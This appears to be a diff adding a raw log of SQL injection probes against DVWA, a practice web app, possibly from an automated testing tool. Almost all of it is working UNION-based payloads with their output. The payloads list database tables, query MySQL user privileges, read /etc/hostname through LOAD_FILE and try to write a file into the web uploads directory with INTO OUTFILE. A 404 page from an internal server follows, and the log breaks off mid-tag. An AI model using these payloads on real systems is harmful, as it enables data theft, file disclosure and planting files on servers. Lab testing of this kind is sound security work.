@@ -1,0 +1,17 @@
+ID: ' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database() -- xFirst name: bac_logSurname: dvwaID: ' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database() -- xFirst name: guestbookSurname: dvwaID: ' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database() -- xFirst name: security_logSurname: dvwaID: ' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database() -- xFirst name: usersSurname: dvwaID: ' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database() -- xFirst name: access_logSurname: dvwa
+ <<== ' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database() -- x
+ <<== ' UNION SELECT file_priv,grant_priv FROM mysq''l.user WHERE user='dvwa' -- x
+ID: ' UNION SELECT LOAD_FILE('/etc/hostname'),2 -- xFirst name: Surname: 2
+ <<== ' UNION SELECT LOAD_FILE('/etc/hostname'),2 -- x
+
+ <<== ' UNION SELECT 'AEGIS_PROOF',2 INTO OUTFILE '/var/www/html/hackable/uploads/aegis_probe.txt' -- x
+404 314
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.68 (Debian) Server at 10.31.0.87 Port 3000</address>
+<
